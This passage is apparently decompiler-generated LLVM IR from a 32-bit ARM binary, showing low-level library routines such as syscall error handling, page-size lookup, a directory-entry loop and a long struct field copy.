  %v3_1332c = urem i32 %arg3, 4096
  %v2_13330 = icmp eq i32 %v3_1332c, 0
  br i1 %v2_13330, label %dec_label_pc_1334c, label %dec_label_pc_13338

dec_label_pc_13338:                               ; preds = %dec_label_pc_13320
  %v0_13338 = call i32 @function_10a30()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_13344 = inttoptr i32 %v0_13338 to i32*
  store i32 22, i32* %v2_13344, align 4
  %v0_1337c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1337c

dec_label_pc_1334c:                               ; preds = %dec_label_pc_13320
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_13378, label %dec_label_pc_13368

dec_label_pc_13368:                               ; preds = %dec_label_pc_1334c
  %v0_13368 = call i32 @function_10a30()
  %v0_1336c = load i32, i32* %r4.global-to-local, align 4
  %v1_1336c = sub i32 0, %v0_1336c
  %v2_13370 = inttoptr i32 %v0_13368 to i32*
  store i32 %v1_1336c, i32* %v2_13370, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13378

dec_label_pc_13378:                               ; preds = %dec_label_pc_1334c, %dec_label_pc_13368
  %v0_13378 = phi i32 [ %arg1, %dec_label_pc_1334c ], [ -1, %dec_label_pc_13368 ]
  store i32 %v0_13378, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1337c

dec_label_pc_1337c:                               ; preds = %dec_label_pc_13338, %dec_label_pc_13378
  %v0_1337c = phi i32 [ %v0_1337c.pre, %dec_label_pc_13338 ], [ %v0_13378, %dec_label_pc_13378 ]
  %v2_13380 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_13380, i32* @r4, align 4
  ret i32 %v0_1337c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1337c, { 1, 0 }
  uselistorder label %dec_label_pc_13378, { 1, 0 }
}

define i32 @function_13388(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_13388:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_13388 = load i32, i32* @r4, align 4
  %v6_13388 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @ip, align 4
  %v2_13390 = icmp eq i32 %arg2, 0
  store i32 123764, i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_13390, label %dec_label_pc_133e4, label %dec_label_pc_133a8

dec_label_pc_133a8:                               ; preds = %dec_label_pc_13388
  %v1_133a8 = add i32 %arg2, 4
  %v2_133a8 = inttoptr i32 %v1_133a8 to i32*
  %v3_133a8 = load i32, i32* %v2_133a8, align 4
  store i32 %v3_133a8, i32* @r3, align 4
  %v1_133ac = and i32 %v3_133a8, 67108864
  %v2_133ac = icmp eq i32 %v1_133ac, 0
  br i1 %v2_133ac, label %dec_label_pc_133b4, label %dec_label_pc_133e4

dec_label_pc_133b4:                               ; preds = %dec_label_pc_133a8
  store i32 20, i32* @r2, align 4
  %v2_133b8 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_133b8, i32* @r0, align 4
  %v0_133bc = call i32 @function_10b30()
  store i32 %v2_133b8, i32* @ip, align 4
  %v0_133e4.pre = load i32, i32* @r5, align 4
  %v0_133ec.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_133e4

dec_label_pc_133e4:                               ; preds = %dec_label_pc_133a8, %dec_label_pc_13388, %dec_label_pc_133b4
  %v0_133ec = phi i32 [ %arg3, %dec_label_pc_133a8 ], [ %arg3, %dec_label_pc_13388 ], [ %v0_133ec.pre, %dec_label_pc_133b4 ]
  %v0_133e8 = phi i32 [ %arg2, %dec_label_pc_133a8 ], [ 0, %dec_label_pc_13388 ], [ %v2_133b8, %dec_label_pc_133b4 ]
  %v0_133e4 = phi i32 [ %arg1, %dec_label_pc_133a8 ], [ %arg1, %dec_label_pc_13388 ], [ %v0_133e4.pre, %dec_label_pc_133b4 ]
  store i32 8, i32* @r3, align 4
  %v4_133f4 = call i32 @function_13944(i32 %v0_133e4, i32 %v0_133e8, i32 %v0_133ec, i32 8)
  store i32 %v3_13388, i32* @r4, align 4
  store i32 %v6_13388, i32* @r5, align 4
  ret i32 %v4_133f4

; uselistorder directives
  uselistorder label %dec_label_pc_133e4, { 2, 0, 1 }
}

define i32 @function_13408(i32 %arg1) local_unnamed_addr {
dec_label_pc_13408:
  %v0_13408 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_13408, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_13408
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_13408, %bb
  %v0_1341c = phi i32 [ %arg1, %dec_label_pc_13408 ], [ 0, %bb ]
  ret i32 %v0_1341c

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_13428() local_unnamed_addr {
dec_label_pc_13428:
  %v4_13434 = load i32, i32* inttoptr (i32 123856 to i32*), align 16
  %v1_13438 = inttoptr i32 %v4_13434 to i32*
  %v2_13438 = load i32, i32* %v1_13438, align 4
  %v2_1343c = icmp eq i32 %v2_13438, 0
  br i1 %v2_1343c, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_13428
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_13428, %bb
  %v1_13444 = phi i32 [ %v2_13438, %dec_label_pc_13428 ], [ 4096, %bb ]
  ret i32 %v1_13444

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_13450() local_unnamed_addr {
dec_label_pc_13450:
  %v1_13460 = load i32, i32* @r0, align 4
  ret i32 %v1_13460
}

define i32 @function_13464(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_13464:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13464 = load i32, i32* @r7, align 4
  store i32 %v3_13464, i32* %stack_var_-8, align 4
  %v0_13470 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_13470, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_13470, -4095
  br i1 %tmp, label %dec_label_pc_13490, label %dec_label_pc_13480

dec_label_pc_13480:                               ; preds = %dec_label_pc_13464
  %v0_13480 = call i32 @function_10a30()
  %v0_13484 = load i32, i32* %r7.global-to-local, align 4
  %v1_13484 = sub i32 0, %v0_13484
  %v2_13488 = inttoptr i32 %v0_13480 to i32*
  store i32 %v1_13484, i32* %v2_13488, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_13490.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_13490

dec_label_pc_13490:                               ; preds = %dec_label_pc_13464, %dec_label_pc_13480
  %v1_13494 = phi i32 [ %v0_13470, %dec_label_pc_13464 ], [ -1, %dec_label_pc_13480 ]
  %v2_13490 = phi i32 [ %v3_13464, %dec_label_pc_13464 ], [ %v2_13490.pre, %dec_label_pc_13480 ]
  store i32 %v2_13490, i32* %r7.global-to-local, align 4
  ret i32 %v1_13494

; uselistorder directives
  uselistorder i32 %v0_13470, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_13490, { 1, 0 }
}

define i32 @function_13498() local_unnamed_addr {
dec_label_pc_13498:
  %v1_134a8 = load i32, i32* @r0, align 4
  ret i32 %v1_134a8
}

define i32 @function_134ac() local_unnamed_addr {
dec_label_pc_134ac:
  %v1_134bc = load i32, i32* @r0, align 4
  ret i32 %v1_134bc
}

define i32 @function_134c0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_134c0:
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %v6_134c0 = load i32, i32* @r5, align 4
  %v18_134c0 = load i32, i32* @sl, align 4
  store i32 141, i32* %r7.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_134f0, label %dec_label_pc_134dc

dec_label_pc_134dc:                               ; preds = %dec_label_pc_134c0
  %v0_134dc = call i32 @function_10a30()
  %v0_134e0 = load i32, i32* @r5, align 4
  %v1_134e0 = sub i32 0, %v0_134e0
  store i32 %v1_134e0, i32* %r3.global-to-local, align 4
  store i32 -1, i32* @r5, align 4
  %v2_134e8 = inttoptr i32 %v0_134dc to i32*
  store i32 %v1_134e0, i32* %v2_134e8, align 4
  br label %dec_label_pc_13544

dec_label_pc_134f0:                               ; preds = %dec_label_pc_134c0
  br i1 false, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_134f0
  store i32 %arg2, i32* %r7.global-to-local, align 4
  %v3_134f8 = add i32 %arg2, %arg1
  store i32 %v3_134f8, i32* @sl, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_134f0, %bb
  %v1_135344 = phi i32 [ %v18_134c0, %dec_label_pc_134f0 ], [ %v3_134f8, %bb ]
  %v0_135302 = phi i32 [ 141, %dec_label_pc_134f0 ], [ %arg2, %bb ]
  br i1 false, label %dec_label_pc_13544, label %dec_label_pc_13530

dec_label_pc_13504:                               ; preds = %dec_label_pc_13530
  %v1_13504 = add i32 %v0_13504, 8
  %v2_13504 = inttoptr i32 %v1_13504 to i16*
  %v3_13504 = load i16, i16* %v2_13504, align 2
  %v4_13504 = zext i16 %v3_13504 to i32
  %v2_13508 = add i32 %v4_13504, %v0_13504
  store i32 %v2_13508, i32* %r3.global-to-local, align 4
  %v1_1350c = add i32 %v2_13508, -1
  %v2_1350c = inttoptr i32 %v1_1350c to i8*
  %v3_1350c = load i8, i8* %v2_1350c, align 1
  %v4_1350c = zext i8 %v3_1350c to i32
  store i32 %v4_1350c, i32* @r4, align 4
  %v1_13510 = call i32 @function_15040(i32 %v1_13530)
  %v0_13514 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_13514, i32* @r1, align 4
  %v1_13518 = add i32 %v1_13510, 1
  store i32 %v1_13518, i32* @r2, align 4
  %v0_1351c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v0_1351c, i32* @r0, align 4
  %v3_13520 = call i32 @function_10b20(i32 %v0_1351c, i32 %v0_13514, i32 %v1_13518)
  %v0_13524 = load i32, i32* %r7.global-to-local, align 4
  %v1_13524 = add i32 %v0_13524, 8
  %v2_13524 = inttoptr i32 %v1_13524 to i16*
  %v3_13524 = load i16, i16* %v2_13524, align 2
  %v4_13524 = zext i16 %v3_13524 to i32
  store i32 %v4_13524, i32* %r3.global-to-local, align 4
  %v0_13528 = load i32, i32* @r4, align 4
  %v1_13528 = trunc i32 %v0_13528 to i8
  %v3_13528 = add i32 %v0_13524, 10
  %v4_13528 = inttoptr i32 %v3_13528 to i8*
  store i8 %v1_13528, i8* %v4_13528, align 1
  %v0_1352c = load i32, i32* %r7.global-to-local, align 4
  %v1_1352c = load i32, i32* %r3.global-to-local, align 4
  %v2_1352c = add i32 %v1_1352c, %v0_1352c
  store i32 %v2_1352c, i32* %r7.global-to-local, align 4
  %v1_13534.pre = load i32, i32* @sl, align 4
  br label %dec_label_pc_13530

dec_label_pc_13530:                               ; preds = %.thread, %dec_label_pc_13504
  %v1_13534 = phi i32 [ %v1_13534.pre, %dec_label_pc_13504 ], [ %v1_135344, %.thread ]
  %v0_13504 = phi i32 [ %v2_1352c, %dec_label_pc_13504 ], [ %v0_135302, %.thread ]
  %v1_13530 = add i32 %v0_13504, 10
  store i32 %v1_13530, i32* %r6.global-to-local, align 4
  %v3_13534 = icmp ult i32 %v0_13504, %v1_13534
  %v1_1353c = add i32 %v0_13504, 11
  store i32 %v1_1353c, i32* %r8.global-to-local, align 4
  br i1 %v3_13534, label %dec_label_pc_13504, label %dec_label_pc_13544

dec_label_pc_13544:                               ; preds = %dec_label_pc_13530, %.thread, %dec_label_pc_134dc
  %v0_13544 = load i32, i32* @r5, align 4
  store i32 %v6_134c0, i32* @r5, align 4
  store i32 %v18_134c0, i32* @sl, align 4
  ret i32 %v0_13544

; uselistorder directives
  uselistorder i32 %v1_13530, { 1, 0 }
  uselistorder i32 %v0_13504, { 2, 4, 3, 1, 0 }
  uselistorder i32 %v18_134c0, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 3, 1, 4 }
  uselistorder i32* %r6.global-to-local, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_10b20, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13530, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_13554() local_unnamed_addr {
dec_label_pc_13554:
  %r7.global-to-local = alloca i32, align 4
  %v0_1355c = load i32, i32* @r1, align 4
  store i32 %v0_1355c, i32* @r3, align 4
  %v0_1356c = load i32, i32* @r0, align 4
  store i32 %v0_1356c, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_1356c, -4095
  br i1 %tmp, label %dec_label_pc_1358c, label %dec_label_pc_13578

dec_label_pc_13578:                               ; preds = %dec_label_pc_13554
  %v0_13578 = call i32 @function_10a30()
  %v0_1357c = load i32, i32* %r7.global-to-local, align 4
  %v1_1357c = sub i32 0, %v0_1357c
  store i32 %v1_1357c, i32* @r3, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_13584 = inttoptr i32 %v0_13578 to i32*
  store i32 %v1_1357c, i32* %v2_13584, align 4
  br label %dec_label_pc_1359c

dec_label_pc_1358c:                               ; preds = %dec_label_pc_13554
  %v2_1358c = icmp eq i32 %v0_1356c, 0
  br i1 %v2_1358c, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1358c
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1358c, %bb
  call void @__pseudo_cond_branch(i1 %v2_1358c, i32 ptrtoint (i32* @global_var_137a4.503 to i32))
  br label %dec_label_pc_1359c

dec_label_pc_1359c:                               ; preds = %dec_label_pc_13578, %.thread
  %v0_1359c = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_1359c

; uselistorder directives
  uselistorder i32 %v0_1356c, { 1, 0, 2 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1359c, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_135ac(i32 %arg1) local_unnamed_addr {
dec_label_pc_135ac:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_135ac = load i32, i32* @r4, align 4
  store i32 %v3_135ac, i32* %stack_var_-16, align 4
  store i32 123764, i32* %r4.global-to-local, align 4
  %v4_135bc = load i32, i32* @global_var_205fc.506, align 4
  %v2_135c0 = icmp eq i32 %v4_135bc, 0
  store i32 %arg1, i32* %r5.global-to-local, align 4
  br i1 %v2_135c0, label %dec_label_pc_135cc, label %dec_label_pc_135dc

dec_label_pc_135cc:                               ; preds = %dec_label_pc_135ac
  %v1_135d0 = call i32 @function_1554c(i32 0)
  %v1_135d4 = icmp slt i32 %v1_135d0, 0
  br i1 %v1_135d4, label %dec_label_pc_13600, label %dec_label_pc_135dcthread-pre-split

dec_label_pc_135dcthread-pre-split:               ; preds = %dec_label_pc_135cc
  %v0_135e0.pr = load i32, i32* %r5.global-to-local, align 4
  %v4_135dc.pre = load i32, i32* @global_var_205fc.506, align 4
  br label %dec_label_pc_135dc

dec_label_pc_135dc:                               ; preds = %dec_label_pc_135dcthread-pre-split, %dec_label_pc_135ac
  %v0_135ec = phi i32 [ %v4_135dc.pre, %dec_label_pc_135dcthread-pre-split ], [ %v4_135bc, %dec_label_pc_135ac ]
  %v1_135f0 = phi i32 [ %v0_135e0.pr, %dec_label_pc_135dcthread-pre-split ], [ %arg1, %dec_label_pc_135ac ]
  %v2_135e0 = icmp eq i32 %v1_135f0, 0
  store i32 %v0_135ec, i32* %r4.global-to-local, align 4
  br i1 %v2_135e0, label %dec_label_pc_13604, label %dec_label_pc_135ec

dec_label_pc_135ec:                               ; preds = %dec_label_pc_135dc
  %v2_135f0 = add i32 %v1_135f0, %v0_135ec
  %v1_135f4 = call i32 @function_1554c(i32 %v2_135f0)
  %v1_135f8 = icmp slt i32 %v1_135f4, 0
  br i1 %v1_135f8, label %dec_label_pc_13600, label %dec_label_pc_135ec.dec_label_pc_13604_crit_edge

dec_label_pc_135ec.dec_label_pc_13604_crit_edge:  ; preds = %dec_label_pc_135ec
  %v0_13604.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13604

dec_label_pc_13600:                               ; preds = %dec_label_pc_135ec, %dec_label_pc_135cc
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_13604

dec_label_pc_13604:                               ; preds = %dec_label_pc_135dc, %dec_label_pc_135ec.dec_label_pc_13604_crit_edge, %dec_label_pc_13600
  %v0_13604 = phi i32 [ %v0_13604.pre, %dec_label_pc_135ec.dec_label_pc_13604_crit_edge ], [ -1, %dec_label_pc_13600 ], [ %v0_135ec, %dec_label_pc_135dc ]
  %v2_13608 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_13608, i32* @r4, align 4
  ret i32 %v0_13604

; uselistorder directives
  uselistorder i32 %v0_135ec, { 1, 0, 2 }
  uselistorder i32 (i32)* @function_1554c, { 1, 0 }
  uselistorder label %dec_label_pc_13604, { 2, 1, 0 }
}

define i32 @function_13618(i32 %arg1) local_unnamed_addr {
dec_label_pc_13618:
  %v1_13628 = load i32, i32* @r0, align 4
  ret i32 %v1_13628
}

define i32 @function_1362c(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_1362c:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  %v3_1362c = load i32, i32* @r4, align 4
  store i32 %v3_1362c, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 104, i32* @r2, align 4
  %v2_13644 = inttoptr i32 %arg2 to i8*
  %v3_13644 = call i32 @function_10a80(i8* %v2_13644, i32 0)
  %v2_13648 = load i32, i32* %arg1, align 4
  store i32 %v2_13648, i32* %r3.global-to-local, align 4
  %v3_13648 = add i32 %tmp, 4
  %v4_13648 = inttoptr i32 %v3_13648 to i32*
  %v5_13648 = load i32, i32* %v4_13648, align 4
  store i32 %v5_13648, i32* %r4.global-to-local, align 4
  %v0_1364c = load i32, i32* %r5.global-to-local, align 4
  %v1_1364c = inttoptr i32 %v0_1364c to i32*
  store i32 %v2_13648, i32* %v1_1364c, align 4
  %v3_1364c = add i32 %v0_1364c, 4
  %v4_1364c = inttoptr i32 %v3_1364c to i32*
  %v5_1364c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1364c, i32* %v4_1364c, align 4
  %v0_13650 = load i32, i32* %r6.global-to-local, align 4
  %v1_13650 = add i32 %v0_13650, 12
  %v2_13650 = inttoptr i32 %v1_13650 to i32*
  %v3_13650 = load i32, i32* %v2_13650, align 4
  %v1_13654 = load i32, i32* %r5.global-to-local, align 4
  %v2_13654 = add i32 %v1_13654, 12
  %v3_13654 = inttoptr i32 %v2_13654 to i32*
  store i32 %v3_13650, i32* %v3_13654, align 4
  %v0_13658 = load i32, i32* %r6.global-to-local, align 4
  %v1_13658 = add i32 %v0_13658, 96
  store i32 %v1_13658, i32* %r3.global-to-local, align 4
  %v1_1365c = inttoptr i32 %v1_13658 to i32*
  %v2_1365c = load i32, i32* %v1_1365c, align 4
  store i32 %v2_1365c, i32* %r3.global-to-local, align 4
  %v3_1365c = add i32 %v0_13658, 100
  %v4_1365c = inttoptr i32 %v3_1365c to i32*
  %v5_1365c = load i32, i32* %v4_1365c, align 4
  store i32 %v5_1365c, i32* %r4.global-to-local, align 4
  %v1_13660 = add i32 %v0_13658, 56
  %v2_13660 = inttoptr i32 %v1_13660 to i32*
  %v3_13660 = load i32, i32* %v2_13660, align 4
  store i32 %v3_13660, i32* %r2.global-to-local, align 4
  %v1_13664 = load i32, i32* %r5.global-to-local, align 4
  %v2_13664 = add i32 %v1_13664, 96
  %v3_13664 = inttoptr i32 %v2_13664 to i32*
  store i32 %v2_1365c, i32* %v3_13664, align 4
  %v0_13668 = load i32, i32* %r4.global-to-local, align 4
  %v1_13668 = load i32, i32* %r5.global-to-local, align 4
  %v2_13668 = add i32 %v1_13668, 100
  %v3_13668 = inttoptr i32 %v2_13668 to i32*
  store i32 %v0_13668, i32* %v3_13668, align 4
  %v0_1366c = load i32, i32* %r6.global-to-local, align 4
  %v1_1366c = add i32 %v0_1366c, 24
  store i32 %v1_1366c, i32* %ip.global-to-local, align 4
  %v1_13670 = inttoptr i32 %v1_1366c to i32*
  %v2_13670 = load i32, i32* %v1_13670, align 4
  store i32 %v2_13670, i32* %ip.global-to-local, align 4
  %v3_13670 = add i32 %v0_1366c, 28
  %v4_13670 = inttoptr i32 %v3_13670 to i32*
  %v5_13670 = load i32, i32* %v4_13670, align 4
  store i32 %v5_13670, i32* %lr.global-to-local, align 4
  %v0_13674 = load i32, i32* %r2.global-to-local, align 4
  %v1_13674 = load i32, i32* %r5.global-to-local, align 4
  %v2_13674 = add i32 %v1_13674, 56
  %v3_13674 = inttoptr i32 %v2_13674 to i32*
  store i32 %v0_13674, i32* %v3_13674, align 4
  %v0_13678 = load i32, i32* %r6.global-to-local, align 4
  %v1_13678 = add i32 %v0_13678, 72
  store i32 %v1_13678, i32* %r3.global-to-local, align 4
  %v1_1367c = add i32 %v0_13678, 32
  store i32 %v1_1367c, i32* %r7.global-to-local, align 4
  %v1_13680 = inttoptr i32 %v1_1367c to i32*
  %v2_13680 = load i32, i32* %v1_13680, align 4
  store i32 %v2_13680, i32* %r7.global-to-local, align 4
  %v3_13680 = add i32 %v0_13678, 36
  %v4_13680 = inttoptr i32 %v3_13680 to i32*
  %v5_13680 = load i32, i32* %v4_13680, align 4
  store i32 %v5_13680, i32* %r8.global-to-local, align 4
  %v1_13684 = inttoptr i32 %v1_13678 to i32*
  %v2_13684 = load i32, i32* %v1_13684, align 4
  %v3_13684 = add i32 %v0_13678, 76
  %v4_13684 = inttoptr i32 %v3_13684 to i32*
  %v5_13684 = load i32, i32* %v4_13684, align 4
  store i32 %v5_13684, i32* %r1.global-to-local, align 4
  %v0_13688 = load i32, i32* %r5.global-to-local, align 4
  %v1_13688 = add i32 %v0_13688, 72
  %v1_1368c = inttoptr i32 %v1_13688 to i32*
  store i32 %v2_13684, i32* %v1_1368c, align 4
  %v3_1368c = add i32 %v0_13688, 76
  %v4_1368c = inttoptr i32 %v3_1368c to i32*
  %v5_1368c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1368c, i32* %v4_1368c, align 4
  %v0_13690 = load i32, i32* %r7.global-to-local, align 4
  %v1_13690 = load i32, i32* %r5.global-to-local, align 4
  %v2_13690 = add i32 %v1_13690, 32
  %v3_13690 = inttoptr i32 %v2_13690 to i32*
  store i32 %v0_13690, i32* %v3_13690, align 4
  %v0_13694 = load i32, i32* %r8.global-to-local, align 4
  %v1_13694 = load i32, i32* %r5.global-to-local, align 4
  %v2_13694 = add i32 %v1_13694, 36
  %v3_13694 = inttoptr i32 %v2_13694 to i32*
  store i32 %v0_13694, i32* %v3_13694, align 4
  %v0_13698 = load i32, i32* %r6.global-to-local, align 4
  %v1_13698 = add i32 %v0_13698, 80
  store i32 %v1_13698, i32* %r3.global-to-local, align 4
  %v1_1369c = add i32 %v0_13698, 48
  store i32 %v1_1369c, i32* %r7.global-to-local, align 4
  %v1_136a0 = inttoptr i32 %v1_1369c to i32*
  %v2_136a0 = load i32, i32* %v1_136a0, align 4
  store i32 %v2_136a0, i32* %r7.global-to-local, align 4
  %v3_136a0 = add i32 %v0_13698, 52
  %v4_136a0 = inttoptr i32 %v3_136a0 to i32*
  %v5_136a0 = load i32, i32* %v4_136a0, align 4
  store i32 %v5_136a0, i32* %r8.global-to-local, align 4
  %v1_136a4 = inttoptr i32 %v1_13698 to i32*
  %v2_136a4 = load i32, i32* %v1_136a4, align 4
  %v3_136a4 = add i32 %v0_13698, 84
  %v4_136a4 = inttoptr i32 %v3_136a4 to i32*
  %v5_136a4 = load i32, i32* %v4_136a4, align 4
  store i32 %v5_136a4, i32* %r1.global-to-local, align 4
  %v1_136a8 = add i32 %v0_13698, 16
  %v2_136a8 = inttoptr i32 %v1_136a8 to i32*
  %v3_136a8 = load i32, i32* %v2_136a8, align 4
  store i32 %v3_136a8, i32* %r2.global-to-local, align 4
  %v0_136ac = load i32, i32* %r5.global-to-local, align 4
  %v1_136ac = add i32 %v0_136ac, 80
  %v1_136b0 = inttoptr i32 %v1_136ac to i32*
  store i32 %v2_136a4, i32* %v1_136b0, align 4
  %v3_136b0 = add i32 %v0_136ac, 84
  %v4_136b0 = inttoptr i32 %v3_136b0 to i32*
  %v5_136b0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_136b0, i32* %v4_136b0, align 4
  %v0_136b4 = load i32, i32* %r7.global-to-local, align 4
  %v1_136b4 = load i32, i32* %r5.global-to-local, align 4
  %v2_136b4 = add i32 %v1_136b4, 48
  %v3_136b4 = inttoptr i32 %v2_136b4 to i32*
  store i32 %v0_136b4, i32* %v3_136b4, align 4
  %v0_136b8 = load i32, i32* %r8.global-to-local, align 4
  %v1_136b8 = load i32, i32* %r5.global-to-local, align 4
  %v2_136b8 = add i32 %v1_136b8, 52
  %v3_136b8 = inttoptr i32 %v2_136b8 to i32*
  store i32 %v0_136b8, i32* %v3_136b8, align 4
  %v0_136bc = load i32, i32* %r2.global-to-local, align 4
  %v1_136bc = load i32, i32* %r5.global-to-local, align 4
  %v2_136bc = add i32 %v1_136bc, 16
  %v3_136bc = inttoptr i32 %v2_136bc to i32*
  store i32 %v0_136bc, i32* %v3_136bc, align 4
  %v0_136c0 = load i32, i32* %r6.global-to-local, align 4
  %v1_136c0 = add i32 %v0_136c0, 88
  store i32 %v1_136c0, i32* %r3.global-to-local, align 4
  %v1_136c4 = add i32 %v0_136c0, 20
  %v2_136c4 = inttoptr i32 %v1_136c4 to i32*
  %v3_136c4 = load i32, i32* %v2_136c4, align 4
  store i32 %v3_136c4, i32* %r2.global-to-local, align 4
  %v1_136c8 = inttoptr i32 %v1_136c0 to i32*
  %v2_136c8 = load i32, i32* %v1_136c8, align 4
  %v3_136c8 = add i32 %v0_136c0, 92
  %v4_136c8 = inttoptr i32 %v3_136c8 to i32*
  %v5_136c8 = load i32, i32* %v4_136c8, align 4
  store i32 %v5_136c8, i32* %r1.global-to-local, align 4
  %v1_136cc = add i32 %v0_136c0, 64
  store i32 %v1_136cc, i32* %r6.global-to-local, align 4
  %v1_136d0 = inttoptr i32 %v1_136cc to i32*
  %v2_136d0 = load i32, i32* %v1_136d0, align 4
  store i32 %v2_136d0, i32* %r6.global-to-local, align 4
  %v3_136d0 = add i32 %v0_136c0, 68
  %v4_136d0 = inttoptr i32 %v3_136d0 to i32*
  %v5_136d0 = load i32, i32* %v4_136d0, align 4
  store i32 %v5_136d0, i32* %r7.global-to-local, align 4
  %v0_136d4 = load i32, i32* %r5.global-to-local, align 4
  %v1_136d4 = add i32 %v0_136d4, 88
  store i32 %v1_136d4, i32* %r3.global-to-local, align 4
  %v2_136d8 = add i32 %v0_136d4, 20
  %v3_136d8 = inttoptr i32 %v2_136d8 to i32*
  store i32 %v3_136c4, i32* %v3_136d8, align 4
  %v0_136dc = load i32, i32* %ip.global-to-local, align 4
  %v1_136dc = load i32, i32* %r5.global-to-local, align 4
  %v2_136dc = add i32 %v1_136dc, 24
  %v3_136dc = inttoptr i32 %v2_136dc to i32*
  store i32 %v0_136dc, i32* %v3_136dc, align 4
  %v0_136e0 = load i32, i32* %lr.global-to-local, align 4
  %v1_136e0 = load i32, i32* %r5.global-to-local, align 4
  %v2_136e0 = add i32 %v1_136e0, 28
  %v3_136e0 = inttoptr i32 %v2_136e0 to i32*
  store i32 %v0_136e0, i32* %v3_136e0, align 4
  %v0_136e4 = load i32, i32* %r6.global-to-local, align 4
  %v1_136e4 = load i32, i32* %r5.global-to-local, align 4
  %v2_136e4 = add i32 %v1_136e4, 64
  %v3_136e4 = inttoptr i32 %v2_136e4 to i32*
  store i32 %v0_136e4, i32* %v3_136e4, align 4
  %v0_136e8 = load i32, i32* %r7.global-to-local, align 4
  %v1_136e8 = load i32, i32* %r5.global-to-local, align 4
  %v2_136e8 = add i32 %v1_136e8, 68
  %v3_136e8 = inttoptr i32 %v2_136e8 to i32*
  store i32 %v0_136e8, i32* %v3_136e8, align 4
  %v0_136ec = load i32, i32* %r3.global-to-local, align 4
  %v1_136ec = inttoptr i32 %v0_136ec to i32*
  store i32 %v2_136c8, i32* %v1_136ec, align 4
  %v3_136ec = add i32 %v0_136ec, 4
